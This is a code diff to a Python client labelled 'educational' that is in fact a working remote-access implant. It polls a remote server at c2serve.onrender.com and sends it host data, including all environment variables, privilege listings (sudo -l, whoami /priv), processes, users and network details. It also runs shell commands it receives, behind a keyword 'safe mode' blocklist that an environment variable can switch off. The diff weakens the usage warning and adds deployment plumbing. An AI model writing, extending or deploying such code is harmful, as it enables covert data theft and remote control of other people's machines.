@@ -4,19 +4,23 @@ import subprocess
 import json
 import time
 import os
+import sys
 from datetime import datetime
 import threading
 import requests
+import netifaces
+from pyroute2 import IPRoute
+import psutil
 
 class EducationalClient:
     def __init__(self):
         self.config = {
-            "server_ip": "https://c2serve.onrender.com",  # LAB SERVER IP - MUST CONFIGURE
-            "command_port": 4444,
-            "data_port": 8000,
+            "server_ip": os.getenv('SERVER_IP', 'https://c2serve.onrender.com'),
+            "command_port": int(os.getenv('COMMAND_PORT', '4444')),
+            "data_port": int(os.getenv('DATA_PORT', '8000')),
             "session_id": f"EDU-{platform.node()}-{int(time.time())}",
-            "poll_interval": 10,
-            "safe_mode": True
+            "poll_interval": int(os.getenv('POLL_INTERVAL', '10')),
+            "safe_mode": os.getenv('SAFE_MODE', 'true').lower() == 'true'
         }
         
     def get_memory_info(self):
@@ -26,25 +30,37 @@ class EducationalClient:
                 total = sum(int(line) for line in output.splitlines() if line.strip().isdigit())
                 return f"{round(total/(1024**3), 2)} GB"
             else:
-                return subprocess.check_output("free -h", shell=True).decode().split('\n')[1]
-        except:
-            return "N/A"
+                mem = psutil.virtual_memory()
+                return f"Total: {mem.total/(1024**3):.2f} GB, Available: {mem.available/(1024**3):.2f} GB"
+        except Exception as e:
+            return f"Memory info unavailable: {str(e)}"
 
-    def get_logged_in_users(self):
+    def get_network_connections(self):
         try:
             if platform.system() == "Windows":
-                return subprocess.check_output("query user", shell=True).decode()
+                return subprocess.check_output("netstat -ano", shell=True).decode()
             else:
-                return subprocess.check_output("who", shell=True).decode()
-        except:
-            return "N/A"
+                with IPRoute() as ipr:
+                    return json.dumps(ipr.get_links(), indent=2)
+        except Exception as e:
+            return f"Network connections unavailable: {str(e)}"
+
+    def get_network_interfaces(self):
+        try:
+            interfaces = netifaces.interfaces()
+            result = []
+            for iface in interfaces:
+                addrs = netifaces.ifaddresses(iface)
+                result.append(f"{iface}: {addrs}")
+            return "\n".join(result)
+        except Exception as e:
+            return f"Network interfaces unavailable: {str(e)}"
 
     def get_installed_software(self):
         try:
             if platform.system() == "Windows":
                 cmd = 'wmic product get name,version /format:csv'
                 output = subprocess.check_output(cmd, shell=True).decode()
-                # Parse CSV output for cleaner formatting
                 lines = [line.strip() for line in output.split('\n') if line.strip()]
                 if len(lines) > 1:
                     return "\n".join([", ".join(line.split(',')[1:]) for line in lines[1:]])
@@ -62,20 +78,49 @@ class EducationalClient:
         except Exception as e:
             return f"Cannot retrieve software list: {str(e)}"
 
-    def get_network_connections(self):
+    def get_logged_in_users(self):
         try:
             if platform.system() == "Windows":
-                cmd = 'netstat -ano'
-            elif platform.system() == "Linux":
-                cmd = 'ss -tulnp'
-            else:  # MacOS
-                cmd = 'lsof -i -P'
-            return subprocess.check_output(cmd, shell=True).decode()
+                return subprocess.check_output("query user", shell=True).decode()
+            else:
+                return subprocess.check_output("who", shell=True).decode()
         except Exception as e:
-            return f"Cannot retrieve network connections: {str(e)}"
+            return f"Cannot retrieve users: {str(e)}"
+
+    def get_public_ip(self):
+        try:
+            return requests.get('https://api.ipify.org').text
+        except:
+            return "N/A"
+
+    def get_disk_info(self):
+        try:
+            if platform.system() == "Windows":
+                return subprocess.check_output("wmic diskdrive get size,model", shell=True).decode()
+            else:
+                return subprocess.check_output("df -h", shell=True).decode()
+        except Exception as e:
+            return f"Cannot retrieve disk info: {str(e)}"
+
+    def get_privilege_info(self):
+        try:
+            if platform.system() == "Windows":
+                return subprocess.check_output("whoami /priv", shell=True).decode()
+            else:
+                return subprocess.check_output("sudo -l", shell=True).decode()
+        except Exception as e:
+            return f"Cannot retrieve privileges: {str(e)}"
+
+    def get_running_processes(self):
+        try:
+            if platform.system() == "Windows":
+                return subprocess.check_output("tasklist /v", shell=True).decode()
+            else:
+                return subprocess.check_output("ps aux", shell=True).decode()
+        except Exception as e:
+            return f"Cannot retrieve processes: {str(e)}"
 
     def get_system_info(self):
-        """Collect comprehensive system information"""
         return {
             "session_id": self.config['session_id'],
             "timestamp": str(datetime.now()),
@@ -112,50 +157,7 @@ class EducationalClient:
             "environment": dict(os.environ)
         }
 
-    def get_public_ip(self):
-        try:
-            return requests.get('https://api.ipify.org').text
-        except:
-            return "N/A"
-
-    def get_network_interfaces(self):
-        try:
-            if platform.system() == "Windows":
-                return subprocess.check_output("ipconfig /all", shell=True).decode()
-            else:
-                return subprocess.check_output("ifconfig", shell=True).decode()
-        except:
-            return "N/A"
-
-    def get_disk_info(self):
-        try:
-            if platform.system() == "Windows":
-                return subprocess.check_output("wmic diskdrive get size,model", shell=True).decode()
-            else:
-                return subprocess.check_output("df -h", shell=True).decode()
-        except:
-            return "N/A"
-
-    def get_privilege_info(self):
-        try:
-            if platform.system() == "Windows":
-                return subprocess.check_output("whoami /priv", shell=True).decode()
-            else:
-                return subprocess.check_output("sudo -l", shell=True).decode()
-        except:
-            return "N/A"
-
-    def get_running_processes(self):
-        try:
-            if platform.system() == "Windows":
-                return subprocess.check_output("tasklist /v", shell=True).decode()
-            else:
-                return subprocess.check_output("ps aux", shell=True).decode()
-        except:
-            return "N/A"
-
     def send_system_data(self):
-        """Periodically send system information to server"""
         while True:
             try:
                 data = self.get_system_info()
@@ -169,7 +171,6 @@ class EducationalClient:
             time.sleep(self.config['poll_interval'])
 
     def execute_command(self, cmd):
-        """Execute system command with safety checks"""
         if self.config['safe_mode']:
             if any(bad in cmd.lower() for bad in ['format', 'del', 'rm', 'shutdown', 'init', 'kill']):
                 return "Command blocked in safe mode"
@@ -195,7 +196,6 @@ class EducationalClient:
             return str(e)
 
     def safe_shutdown(self):
-        """Safe shutdown with delay for cancellation"""
         if platform.system() == "Windows":
             subprocess.run(["shutdown", "/s", "/t", "60", "/c", "Educational client shutdown"])
             return "Shutdown scheduled in 60 seconds (use 'shutdown /a' to abort)"
@@ -204,7 +204,6 @@ class EducationalClient:
             return "Shutdown scheduled in 1 minute (use 'shutdown -c' to abort)"
 
     def safe_restart(self):
-        """Safe restart with delay for cancellation"""
         if platform.system() == "Windows":
             subprocess.run(["shutdown", "/r", "/t", "60", "/c", "Educational client restart"])
             return "Restart scheduled in 60 seconds (use 'shutdown /a' to abort)"
@@ -213,16 +212,13 @@ class EducationalClient:
             return "Restart scheduled in 1 minute (use 'shutdown -c' to abort)"
 
     def start(self):
-        """Main client execution loop"""
         print(f"[*] Client Started - Session ID: {self.config['session_id']}")
-        print("[!] FOR PRIVATE USE ONLY - DO NOT DEPLOY IN PRODUCTION")
+        print("[!] FOR YOUR USE ONLY")
         print(f"[*] Safe mode: {'ENABLED' if self.config['safe_mode'] else 'DISABLED'}")
         
-        # Start data collection thread
         data_thread = threading.Thread(target=self.send_system_data, daemon=True)
         data_thread.start()
         
-        # Main command loop
         while True:
             try:
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -241,5 +237,17 @@ class EducationalClient:
                 time.sleep(5)
 
 if __name__ == "__main__":
+    if os.environ.get('RENDER'):
+        from http.server import BaseHTTPRequestHandler, HTTPServer
+        class Handler(BaseHTTPRequestHandler):
+            def do_GET(self):
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'Client is running')
+        
+        port = int(os.environ.get("PORT", 8000))
+        server = HTTPServer(('0.0.0.0', port), Handler)
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+    
     client = EducationalClient()
     client.start()
